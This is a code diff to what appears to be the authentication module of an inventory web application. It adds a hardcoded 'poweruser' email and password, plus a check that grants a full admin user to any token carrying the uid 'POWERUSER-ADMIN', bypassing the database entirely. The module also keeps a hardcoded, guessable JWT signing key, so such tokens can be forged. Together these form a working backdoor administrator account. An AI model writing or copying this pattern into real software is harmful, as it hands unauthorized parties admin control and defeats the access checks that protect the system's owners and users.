@@ -13,6 +13,11 @@ SECRET_KEY = "inventory-secret-key-change-in-production"
 ALGORITHM = "HS256"
 ACCESS_TOKEN_EXPIRE_MINUTES = 60 * 24  # 24 hours
 
+# Hardcoded Poweruser (Bypasses Database)
+POWERUSER_EMAIL = "poweruser@gmail.com"
+POWERUSER_PASSWORD = "poweruser"
+POWERUSER_UID = "POWERUSER-ADMIN"
+
 pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")
 oauth2_scheme = OAuth2PasswordBearer(tokenUrl="/api/auth/login")
 
@@ -49,6 +54,19 @@ def get_current_user(
             raise credentials_exception
     except JWTError:
         raise credentials_exception
+
+    # Check for hardcoded poweruser first
+    if uid == POWERUSER_UID:
+        return User(
+            id=0,
+            uid=POWERUSER_UID,
+            name="Power User",
+            email=POWERUSER_EMAIL,
+            role="admin",
+            authorized=True,
+            created_at=datetime.utcnow(),
+            updated_at=datetime.utcnow()
+        )
 
     user = db.query(User).filter(User.uid == uid).first()
     if user is None:
